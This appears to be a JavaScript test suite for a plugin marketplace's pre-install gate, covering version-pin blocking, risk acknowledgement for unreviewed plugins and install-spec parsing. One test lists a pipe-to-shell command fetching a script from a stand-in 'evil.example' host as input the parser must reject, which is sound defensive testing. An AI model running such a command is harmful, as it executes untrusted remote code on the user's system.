/**
 * 装前闸门测试 —— 本插件最核心的安全属性。
 *
 * 覆盖三类判定：
 *   · 正常路径：仓库自带的已验证插件，在健康的 profile 上应当放行
 *   · ★ 致命硬拦截：候选包把 @deepseek-ai/* 精确 pin 到别的 dsh 版本
 *     （这一条对应真实事故：缺具名导出 → 整棵插件树加载失败 → dsh web 完全起不来）
 *   · 可覆盖拦截 / 未审核层级：默认拦住，但允许用户在知情后继续
 * 另外覆盖安装规格解析 —— 绝不复用公共索引里的原始命令。
 */

import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { suite, test, assert, eq, REPO_ROOT as REPO, importBuilt, ensureTestProfile } from './harness.mjs';

// 针对**打包产物**测试（见 harness.mjs 顶部说明）：源码树与打包布局的相对深度不同，
// 只测源码会漏掉 cwd / 包内资源解析错位这一类问题。
const { runGate, extractCleanSpec, readPackageFromTarball } = await importBuilt('lib/gate.js');
const { detectEnvironment, readJsonSafe, compareVersions } = await importBuilt('lib/util.js');
const { readProfileState, scanInstalled, composedTree, resolveRuntimePackageVersion } = await importBuilt('lib/profile.js');
const { loadCatalogIndex, normalizeEntry } = await importBuilt('lib/catalog.js');

// 测试针对**隔离环境**跑，绝不碰生产 profile
const DEV_HOME = process.env.DPM_TEST_HOME ?? path.join(os.homedir(), '.dsh-dev');
process.env.DSH_HOME = DEV_HOME;

// ★ 隔离 profile 读不到就铺一份最小 fixture。
//   闸门要在一个「已初始化的 profile」上判定，而 CI 上没有 dsh、没人替我们建它 ——
//   不铺的话这组测试会在 CI 里恒红、开发机上恒绿，很快就会被当成噪音。
//   已存在的 profile 一个字节都不动。
const fixture = ensureTestProfile({ home: DEV_HOME });
if (fixture.created) console.log(`  （隔离 profile 不存在，已铺最小 fixture：${fixture.dir}）`);

const compat = readJsonSafe(path.join(REPO, 'compatibility.json'));
// ★ preferRemote:false —— 闸门测试要的是「给定一份目录，判定是否正确」，
// 不该依赖网络、也不该被上游目录此刻的内容左右。用包内那份，测试才是可复现的。
const verified = await loadCatalogIndex({ preferRemote: false });

/** 迷你 tar.gz 写入器：只为造一个可控的候选包 */
function makeTgz(files) {
  const blocks = [];
  for (const [name, content] of Object.entries(files)) {
    const data = Buffer.from(content, 'utf8');
    const header = Buffer.alloc(512);
    header.write(name, 0, 100, 'utf8');
    header.write('0000644\0', 100, 8);
    header.write('0000000\0', 108, 8);
    header.write('0000000\0', 116, 8);
    header.write(`${data.length.toString(8).padStart(11, '0')}\0`, 124, 12);
    header.write(`${Math.floor(Date.now() / 1000).toString(8).padStart(11, '0')}\0`, 136, 12);
    header.write('        ', 148, 8);
    header.write('0', 156, 1);
    header.write('ustar\0', 257, 6);
    header.write('00', 263, 2);
    let sum = 0;
    for (const b of header) sum += b;
    header.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 8);
    blocks.push(header, data);
    const pad = (512 - (data.length % 512)) % 512;
    if (pad) blocks.push(Buffer.alloc(pad));
  }
  blocks.push(Buffer.alloc(1024));
  return zlib.gzipSync(Buffer.concat(blocks), { level: 9 });
}

function buildCtx() {
  const env = detectEnvironment(process.env);
  const profile = compat?.profile ?? 'web';
  const state = readProfileState(profile, process.env);
  return {
    env,
    compat,
    profileState: state,
    installed: scanInstalled(profile, process.env),
    // 不传 launcher：让 composedTree 自己解析「怎么调 dsh」（优先 lib/bin.js）。
    // 传 env.dsh.launcher（dsh.cmd）会走 shell 跑薄壳 —— 那既触发 DEP0190，
    // 又依赖 PATH 继承，正是插件本身已经刻意避开的东西。
    tree: composedTree(profile, process.env),
    repoRoot: REPO,
    repoRawBase: 'https://raw.githubusercontent.com/HaydenSmith1121/dsh-plugins/main',
  };
}

suite('gate / 正常路径');

test('隔离环境存在且是健康的（测试前置）', () => {
  assert(fs.existsSync(DEV_HOME), `测试前置：找不到隔离环境 ${DEV_HOME}`);
  const state = readProfileState(compat.profile ?? 'web', process.env);
  assert(state.initialized, '隔离 profile 应当已初始化');
  assert(state.bundles.length >= 2, '应当至少有内置的两个 bundle');
});

test('包内兜底目录（tier=verified）已生成且条目自洽', () => {
  assert(verified.available, `包内目录不可用：${verified.error}`);
  assert(verified.entries.length > 0, '包内兜底目录不能是空的');
  for (const p of verified.entries) {
    eq(p.tier, 'verified', `${p.id} 出现在包内兜底目录里就必须是 verified 层`);
    eq(p.install.method, 'tarball', `${p.id} 的安装方法应当是 tarball`);
    assert(p.slug, `${p.id} 索引条目必须带 slug —— 它没有 slug 就读不到自己的配置文件`);
  }
  assert(verified.entries.some((p) => p.package === 'dsh-plugins-market'), '本插件应当把自己也列进目录');
});

test('★ 索引只负责「列出来」，安装用的字段在**单条配置文件**里', async () => {
  // 这条断言钉住的是本版的核心约定：
  //   索引（catalog/index.json）是给列表页看的，里面**没有** sha256 / tarball / url；
  //   安装要用的那些字段只能来自那个插件自己的 catalog/plugins/<slug>.json。
  //   如果哪天有人图省事把安装字段塞回索引，这条会红。
  const { loadPluginConfig, entryFromConfig } = await importBuilt('lib/catalog.js');
  const indexEntry = verified.entries.find((p) => p.package === 'dsh-plugins-market');
  assert(indexEntry, '包内兜底目录里应当有本插件');

  const { config, source } = await loadPluginConfig(indexEntry);
  assert(config, `读不到本插件的配置文件（来源 ${source}）`);
  const merged = entryFromConfig(config, indexEntry);

  const isSelf = merged.package === 'dsh-plugins-market';
  if (isSelf) {
    // 自引用条目无法自包含 hash（算完 hash 又要重写 tarball），但必须如实说明
    eq(merged.sha256, null, '自引用条目不应带 sha256');
    assert(merged.sha256Note, '自引用条目必须带 sha256Note 说明为什么没有校验和');
  } else {
    assert(merged.sha256?.length === 64, `${merged.package} 应当带上 sha256（tarball 的字节完整性靠它）`);
  }
  assert(merged.install.tarball, `${merged.package} 应当带 tarball 相对路径`);
  assert(merged.install.url, `${merged.package} 应当带可下载地址`);
  eq(merged.install.method, 'tarball');
});

test('已验证插件在健康 profile 上放行（verdict=pass/warn，可安装）', async () => {
  // ★ 必须先读**那个插件自己的配置文件**，再拿去跑闸门 —— 这正是市场的真实路径
  //   （索引只负责列出来，安装用的 url / sha256 / tarball 只在配置文件里）。
  //   如果这里图省事直接拿索引条目跑闸门，得到的会是「没有可用的安装方式」——
  //   那不是 bug，而是「索引不足以决定怎么装」这条设计的直接体现。
  const { loadPluginConfig, entryFromConfig } = await importBuilt('lib/catalog.js');
  const ctx = buildCtx();
  for (const indexEntry of verified.entries) {
    const { config, error } = await loadPluginConfig(indexEntry);
    assert(config, `${indexEntry.slug}: 读不到配置文件（${error ?? ''}）`);
    const entry = entryFromConfig(config, indexEntry);

    const report = runGate(entry, ctx, { targetProfile: compat.profile ?? 'web' });
    const fatalHard = report.checks.filter((c) => c.status === 'fail' && c.severity === 'fatal' && !c.overridable);
    assert(
      fatalHard.length === 0,
      `${entry.id} 被硬拦截：${fatalHard.map((c) => `${c.id}(${c.detail})`).join(' / ')}`,
    );
    assert(report.installable, `${entry.id} 应当有可用的安装规格`);
    eq(report.verdict === 'block', false, `${entry.id} 不应被判为硬拦截`);
    eq(report.counts.fatalBlocking, 0, `${entry.id} 不应有不可覆盖的致命项`);
  }
});

test('检查项覆盖环境层 / profile 层 / 候选包层', () => {
  const ctx = buildCtx();
  const report = runGate(verified.entries[0], ctx, {});
  const ids = report.checks.map((c) => c.id);
  assert(ids.some((i) => i.startsWith('env.')), '应包含环境层检查');
  assert(ids.some((i) => i.startsWith('profile.')), '应包含 profile 层检查');
  assert(ids.some((i) => i.startsWith('cand.')), '应包含候选包层检查');
  eq(report.checks.every((c) => c.id && c.title && c.severity && c.status), true, '每个检查项都应有完整字段');
});

suite('gate / ★ 致命硬拦截');

test('★ peer 精确 pin 到**更高**版本（本机缺接口）→ 不可覆盖的硬拦截', () => {
  // 这模拟的是真实事故：dsh-opencode-go-plus 把 @deepseek-ai/dsh-llm 精确 pin 在
  // 0.1.6-alpha.1，在 0.1.5 线上装 → 内置 dsh-llm 缺 0.1.6 的导出 → 整棵树加载失败。
  // 特征：插件要求的版本 **高于** 本机。
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'dpm-gate-'));
  const tgz = path.join(tmp, 'wants-newer-1.0.0.tgz');
  const env = detectEnvironment(process.env);
  // 造一个明确高于本机的 pin
  const newer = '99.0.0';
  fs.writeFileSync(tgz, makeTgz({
    'package/package.json': JSON.stringify({
      name: 'wants-newer',
      version: '1.0.0',
      type: 'module',
      main: 'lib/index.js',
      exports: { '.': { default: './lib/index.js' } },
      dsh: { bundle: { patch: './cordis.patch.yml' } },
      peerDependencies: { '@deepseek-ai/dsh-llm': newer },
    }, null, 2),
    'package/cordis.patch.yml': "- insert:\n    - id: wants-newer\n      name: 'wants-newer'\n",
    'package/lib/index.js': 'export const name = "wants-newer";\n',
  }));

  // 测试前置：必须能真正解析出本机的 dsh-llm 版本，否则这条测试没意义
  const real = resolveRuntimePackageVersion('@deepseek-ai/dsh-llm', { dshDir: env.dsh.dir, env: process.env });
  assert(real.version, '测试前置：应当能解析出本机 @deepseek-ai/dsh-llm 的版本（否则 peer 判定会退化为「无法判定」）');
  assert(compareVersions(real.version, newer) < 0, `测试前置：本机 ${real.version} 应低于 ${newer}`);

  const entry = normalizeEntry({
    id: 'wants-newer', package: 'wants-newer', version: '1.0.0',
    install: { kind: 'local-tarball', spec: tgz, tarball: tgz },
  }, 'reviewed');

  const report = runGate(entry, buildCtx(), { targetProfile: compat.profile ?? 'web' });
  const peer = report.checks.find((c) => c.id === 'cand.peer-runtime');
  assert(peer, '应当产生 cand.peer-runtime 检查项');
  eq(peer.status, 'fail', 'pin 到更高版本应当判为 fail');
  eq(peer.severity, 'fatal', 'pin 到更高版本应当是 fatal 级别');
  eq(report.verdict, 'block', '整体判定应当是硬拦截');
  eq(report.canInstall, false, '硬拦截时不允许安装');
  assert(report.blockedBy.includes('cand.peer-runtime'), 'blockedBy 应当列出该检查项');

  // 即使显式确认风险，不可覆盖的项也绝不能放行
  const forced = runGate(entry, buildCtx(), { targetProfile: compat.profile ?? 'web', acknowledgeRisk: true });
  eq(forced.canInstall, false, '★ 不可覆盖的致命项：即使 acknowledgeRisk=true 也必须保持拦截');
  fs.rmSync(tmp, { recursive: true, force: true });
});

test('★ 精确 pin 到**更低**版本（本机更新）→ 只告警，不拦（dsh-receipt 真实形态）', () => {
  // dsh-receipt 精确 pin 了 cordis@4.0.1 / dsh-session@0.1.0-rc.6 / dsh-tools@0.1.0-rc.6，
  // 本机是 4.0.2 / 0.1.6-alpha.1 —— 全都不一致，但它现在正常工作。
  // 如果按「pin 不等即致命」判定，就会把仓库自带的已验证插件自己拦掉。
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'dpm-gate-'));
  const tgz = path.join(tmp, 'wants-older-1.0.0.tgz');
  fs.writeFileSync(tgz, makeTgz({
    'package/package.json': JSON.stringify({
      name: 'wants-older', version: '1.0.0', type: 'module', main: 'lib/index.js',
      dsh: { bundle: { patch: './cordis.patch.yml' } },
      peerDependencies: { '@deepseek-ai/dsh-llm': '0.0.1' },
    }, null, 2),
    'package/cordis.patch.yml': "- insert:\n    - id: wants-older\n      name: 'wants-older'\n",
    'package/lib/index.js': 'export const name = "wants-older";\n',
  }));
  const entry = normalizeEntry({
    id: 'wants-older', package: 'wants-older', version: '1.0.0',
    install: { kind: 'local-tarball', spec: tgz, tarball: tgz },
  }, 'reviewed');
  const report = runGate(entry, buildCtx(), { targetProfile: compat.profile ?? 'web' });
  const peer = report.checks.find((c) => c.id === 'cand.peer-runtime');
  eq(peer?.status, 'warn', '本机版本更高时应当只告警（向后兼容）');
  eq(report.canInstall, true, '★ 不应因为「pin 比本机旧」而拦掉可以正常加载的插件');
  assert(!report.blockedBy.includes('cand.peer-runtime'), '不应进入硬拦截名单');
  fs.rmSync(tmp, { recursive: true, force: true });
});

test('★ 声明的 patch 文件不在包里 → 不可覆盖的硬拦截', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'dpm-gate-'));
  const tgz = path.join(tmp, 'no-patch-1.0.0.tgz');
  fs.writeFileSync(tgz, makeTgz({
    'package/package.json': JSON.stringify({
      name: 'no-patch', version: '1.0.0', type: 'module', main: 'lib/index.js',
      dsh: { bundle: { patch: './cordis.patch.yml' } },
    }, null, 2),
    // 故意不放 cordis.patch.yml —— boot 期会 throw "failed to read overlay"
    'package/lib/index.js': 'export const name = "no-patch";\n',
  }));
  const entry = normalizeEntry({
    id: 'no-patch', package: 'no-patch', version: '1.0.0',
    install: { kind: 'local-tarball', spec: tgz, tarball: tgz },
  }, 'reviewed');
  const report = runGate(entry, buildCtx(), { targetProfile: compat.profile ?? 'web', acknowledgeRisk: true });
  const check = report.checks.find((c) => c.id === 'cand.patch-present');
  eq(check?.status, 'fail', '应当检出 patch 文件缺失');
  eq(report.canInstall, false, '不应允许安装');
  fs.rmSync(tmp, { recursive: true, force: true });
});

test('没有声明 dsh.bundle → 可覆盖的致命项（装了也不会加载）', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'dpm-gate-'));
  const tgz = path.join(tmp, 'plain-dep-1.0.0.tgz');
  fs.writeFileSync(tgz, makeTgz({
    'package/package.json': JSON.stringify({ name: 'plain-dep', version: '1.0.0', type: 'module', main: 'index.js' }, null, 2),
    'package/index.js': 'export default 1;\n',
  }));
  const entry = normalizeEntry({
    id: 'plain-dep', package: 'plain-dep', version: '1.0.0',
    install: { kind: 'local-tarball', spec: tgz, tarball: tgz },
  }, 'reviewed');
  const report = runGate(entry, buildCtx(), { targetProfile: compat.profile ?? 'web' });
  const check = report.checks.find((c) => c.id === 'cand.bundle-declared');
  eq(check?.status, 'fail', '应检出缺少 dsh.bundle');
  eq(check?.overridable, true, '这一条应当允许覆盖（有些仓库的插件在子目录里）');
  eq(report.verdict, 'block-overridable', '应当是「默认拦截但可覆盖」');
  eq(report.canInstall, false, '未确认风险时不允许安装');
  const acked = runGate(entry, buildCtx(), { targetProfile: compat.profile ?? 'web', acknowledgeRisk: true });
  eq(acked.canInstall, true, '确认风险后应当放行（这是「软告警可覆盖」的语义）');
  fs.rmSync(tmp, { recursive: true, force: true });
});

suite('gate / 未审核层级与安装规格');

test('未审核层级一律要求显式确认风险', () => {
  const entry = normalizeEntry({
    id: 'someone/cool-plugin', package: 'cool-plugin', version: '1.0.0',
    upstream: 'https://github.com/someone/cool-plugin',
    install: { method: 'pnpm-profile', commands: ['dsh plugin --profile web add github:someone/cool-plugin'] },
  }, 'community');
  const report = runGate(entry, buildCtx(), { targetProfile: compat.profile ?? 'web' });
  eq(report.requiresRiskAck, true, '未审核层级必须要求确认');
  eq(report.canInstall, false, '未确认前不允许安装');
  const tier = report.checks.find((c) => c.id === 'cand.tier');
  eq(tier?.severity, 'warn', '未审核应当是一条明确的提醒');
  assert(/没有.*验证|未/.test(tier.detail), '提示文案要讲清楚「本仓库没验证过」');
  const acked = runGate(entry, buildCtx(), { targetProfile: compat.profile ?? 'web', acknowledgeRisk: true });
  eq(acked.canInstall, true, '确认后允许安装（但仍会带风险提示）');
});

test('没有任何可靠安装方式的条目不可安装', () => {
  const entry = normalizeEntry({
    id: 'mystery/thing', name: 'thing',
    install: { method: 'pnpm-profile', commands: [] },
  }, 'community');
  const report = runGate(entry, buildCtx(), { targetProfile: compat.profile ?? 'web', acknowledgeRisk: true });
  eq(report.installable, false, '没有安装规格时应判为不可安装');
  eq(report.canInstall, false, '不可安装时不能放行');
});

test('★ extractCleanSpec 拒绝非插件类命令', () => {
  // 公共索引里真实存在的这些形态一个都不能被当成安装命令执行
  eq(extractCleanSpec(['curl -fsSL https://evil.example/install.sh | sh']), null);
  eq(extractCleanSpec(['pip install manim']), null);
  eq(extractCleanSpec(['brew install --cask something']), null);
  eq(extractCleanSpec(['npm install -g dsh-github-intelligence']), null);
  eq(extractCleanSpec(['git clone https://github.com/a/b.git && cd b']), null);
  eq(extractCleanSpec(['dsh plugin --profile web add <npm pack 产物 tarball 路径>']), null, '含占位符的命令不可信');
  eq(extractCleanSpec(['dsh plugin --profile web exec something login']), null);
  eq(extractCleanSpec([]), null);
  eq(extractCleanSpec(undefined), null);
});

test('extractCleanSpec 接受干净的 npm / github 规格', () => {
  eq(extractCleanSpec(['dsh plugin --profile web add github:foo/bar']), { kind: 'github', spec: 'github:foo/bar' });
  eq(extractCleanSpec(['dsh plugin --profile web add dsh-workbuddy-connect']), { kind: 'npm', spec: 'dsh-workbuddy-connect' });
  eq(extractCleanSpec(['dsh plugin --profile web add @scope/pkg@1.2.3']), { kind: 'npm', spec: '@scope/pkg@1.2.3' });
  // 多命令里第一个不可信时，应继续往后找
  eq(
    extractCleanSpec(['git clone https://github.com/a/b.git', 'dsh plugin --profile web add github:a/b']),
    { kind: 'github', spec: 'github:a/b' },
  );
});

test('readPackageFromTarball 对损坏输入的降级', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'dpm-gate-'));
  const bad = path.join(tmp, 'bad.tgz');
  fs.writeFileSync(bad, Buffer.from('this is not a gzip'));
  const r = readPackageFromTarball(bad);
  eq(r.manifest, null);
  assert(r.error, '应当给出可读的错误原因，而不是抛异常');
  fs.rmSync(tmp, { recursive: true, force: true });
});
